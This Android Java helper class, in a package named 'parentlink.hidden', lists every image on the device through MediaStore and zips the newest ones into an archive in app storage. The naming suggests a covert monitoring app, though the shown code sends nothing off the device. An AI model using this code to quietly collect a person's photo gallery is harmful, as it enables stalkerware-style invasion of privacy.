package com.parentlink.hidden;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.MediaStore;
import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

public class FileExplorerHelper {
    
    public static List<String> getAllImages(Context context) {
        List<String> imagePaths = new ArrayList<>();
        ContentResolver resolver = context.getContentResolver();
        
        String[] projection = {MediaStore.Images.Media.DATA};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
        
        try (Cursor cursor = resolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection, null, null, sortOrder)) {
            
            if (cursor != null && cursor.moveToFirst()) {
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
                do {
                    String path = cursor.getString(dataColumn);
                    if (path != null && new File(path).exists()) {
                        imagePaths.add(path);
                    }
                } while (cursor.moveToNext());
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return imagePaths;
    }
    
    public static List<String> getLatestImages(Context context, int limit) {
        List<String> all = getAllImages(context);
        if (all.isEmpty()) return new ArrayList<>();
        int end = Math.min(limit, all.size());
        return all.subList(0, end);
    }
    
    public static String zipImages(List<String> imagePaths, Context context) {
        String zipPath = context.getFilesDir() + "/gallery_" + System.currentTimeMillis() + ".zip";
        
        try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipPath))) {
            for (String imagePath : imagePaths) {
                File imageFile = new File(imagePath);
                if (imageFile.exists()) {
                    zos.putNextEntry(new ZipEntry(imageFile.getName()));
                    byte[] buffer = new byte[1024];
                    try (java.io.FileInputStream fis = new java.io.FileInputStream(imageFile)) {
                        int length;
                        while ((length = fis.read(buffer)) > 0) {
                            zos.write(buffer, 0, length);
                        }
                    }
                    zos.closeEntry();
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
        return zipPath;
    }
}